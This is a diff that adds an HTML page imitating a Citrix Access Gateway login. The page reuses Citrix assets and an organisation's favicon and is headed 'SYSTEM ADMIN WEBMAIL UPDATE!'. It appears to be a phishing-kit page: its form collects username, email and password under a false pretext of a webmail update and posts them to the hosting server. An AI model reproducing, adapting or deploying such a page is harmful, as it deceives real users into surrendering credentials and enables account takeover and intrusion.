@@ -1,0 +1,122 @@
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XDEV_HTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>WEBMAIL UPDATE!</title>
+<link rel="SHORTCUT ICON" href="https://webmail-auth.acmedctr.org/vpn/images/AccessGateway.ico" type="image/vnd.microsoft.icon">
+<link href="index_files/rdx.css" rel="stylesheet" type="text/css">
+<link href="index_files/base.css" rel="stylesheet" type="text/css" media="screen">
+<link rel="stylesheet" href="index_files/citrix-fonts.css" type="text/css">
+<link href="index_files/custom.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" src="index_files/rdx.js"></script>
+<script type="text/javascript" src="index_files/login.js"></script>
+<script type="text/javascript" src="index_files/views.js"></script>
+<script type="text/javascript" src="index_files/gateway_login_view.js"></script>
+<script type="text/javascript" src="index_files/tmindex_view.js"></script> 
+<style type="text/css">
+body
+{
+  display : none;
+  visibility: hidden;
+}
+</style>
+<script language="JavaScript">
+// frame-busting script
+function changePage()
+{
+	if( self == top ) {
+  		 document.getElementsByTagName("body")[0].style.display = 'block' ;
+		 document.getElementsByTagName("body")[0].style.visibility = 'visible' ;
+		 ns_fillName();
+	} else {
+   		top.location = self.location ;
+	}
+
+}
+function setFocus(obj)
+{
+   if (obj != null) {
+      obj.focus();
+   }
+}			
+
+//-->
+</script>
+<script type="text/javascript" src="index_files/resources.js"></script>
+<script type="text/javascript" language="javascript">
+var Resources = new ResourceManager("/logon/themes/Default/resources/{lang}", "logon");
+</script>
+<script type="text/javascript" src="index_files/nsshare.js"></script>
+<meta content="MSHTML 6.00.2900.2802" name="GENERATOR">
+</head>
+<body class="ns_body" id="bodyTag" style="display: block; visibility: visible;">
+<!-- Copyright 2001-2005 Citrix Systems, Inc. All Rights Reserved -->
+<noscript>
+<BR><BR>
+<table style="WIDTH: 100%">
+<tr>
+ 	<td align="center">
+		<table class="CTXMSAM_LogonFont">
+			<tr id="errorMessageRow">
+				<td class="glowBoxLeft">&nbsp;</td>                            
+				<td class="loginTableMidWidth">
+					<div id="feedbackArea">
+					<div id="feedbackStyle" class="feedbackStyleError">
+					<span id="errorMessageLabel" class="messageStyle">
+					JavaScript is either disabled in or not supported by the Web browser.  
+					To continue logon, use a Web browser that supports JavaScript or enable JavaScript in your current browser.
+					</span>
+					</div>
+					</div>
+				</td>                           
+				<td class="glowBoxRight">&nbsp;</td>
+			</tr>
+		</table>
+	</td>
+</tr>
+</table>
+
+<table style="display:none">
+</noscript>
+
+
+<div class="activity_status_bar"><div class="activity_bar activity_status_bar_position" style="display: none;"><span></span></div><div class="status_bar activity_status_bar_position" style="display: none;"><span></span></div></div><div class="ns_header_container"><div class="base_view_no_view_top_container"><div class="base_view_container"><div class="header_parent_div"><div class="ns_header ns_header_view_panel"><a href="#ns_content" aria-label="Skip Navigation" class="skip_navigation">Skip Navigation</a><div class="full_width_table ns_banner_table rdx_page_center_align header_info"><div class="info_cell_left"></div><div class="info_cell_right"><div class="header_info_right"><ul><li class="header_view_menu_settings_link_app_search header_view_menu_settings_link"><a class="app_search_button_in_header_hide"></a></li></ul></div></div></div></div></div></div></div></div><div class="center_panel" style="display: block;"><div class="loading_panel">rdx.page_loading</div></div><div class="rdx_message_container rdx_page_center_align" style="width: 1346px;"></div><div id="ns_content" class="ns_content rdx_page_center_align" style="display: block; min-height: 709px;"></div><div class="popup popup_info auto-refresh">rdx.page_auto_refresh_off</div><div class="view_div_decorator base_view_no_view_top_container"><div class="base_view_container"><div id="authentication" style="margin-top: -129px;"><div id="logonbelt-topshadow"><table class="full_width"><tr id="row1"><td class="header_left NS-AAA"></td></tr><tr id="row2"><td colspan="2" class="navbar"></td></tr></table></div><div id="logonbox-container"><div id="logonbox-innerbox"><div id="logonbox-logoarea" class="NS-AAA"><div id="logonbox-logoimage"></div></div><div id="logonbox-logonform" class="clearfix"><div class="view_div_decorator base_view_no_view_top_container"><div class="base_view_container">
+
+	<form method="post" action="" name="vpnForm" autocomplete="off" style="magin:0" id="vpnForm" onsubmit="clean_name_cookie();"><div id="ctl08_loginAgentCdaHeaderText2" class="CTX_ContentTitleHeader login_page">SYSTEM ADMIN WEBMAIL UPDATE!</div><div class="field clearfix CredentialTypeusername">
+
+
+		<div class="left">
+		<span class="plain input_labels form_text" id="User_name">User name:</span>
+	</div><div class="right"><input type="text" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="username" id="login" size="30" maxlength="127" autofocus="autofocus" width="180px"></div></div>
+<div class="field clearfix CredentialTypeusername">
+	<div class="left">
+		<span class="plain input_labels form_text" id="User_name">Email:</span>
+	</div><div class="right"><input type="text" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="email" id="login" size="30" maxlength="127" autofocus="autofocus" width="180px"></div></div>
+
+
+
+	<div class="field clearfix CredentialTypepassword"><div class="left"><span class="plain input_labels form_text" id="Password">Password:</span></div><div class="right"><input type="password" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="password" id="passwd" size="30" maxlength="127" width="180px"></div>
+
+
+
+</div><div class="field CredentialTypenone"></div><div class="field buttons"><div class="left"></div><div class="right"><input type="submit" id="Log_On" value="Log On" class="custombutton login_page"></div></div>
+
+
+
+
+
+</form>
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div></div><div id="logonbelt-bottomshadow"></div></div></div></div></body></html>
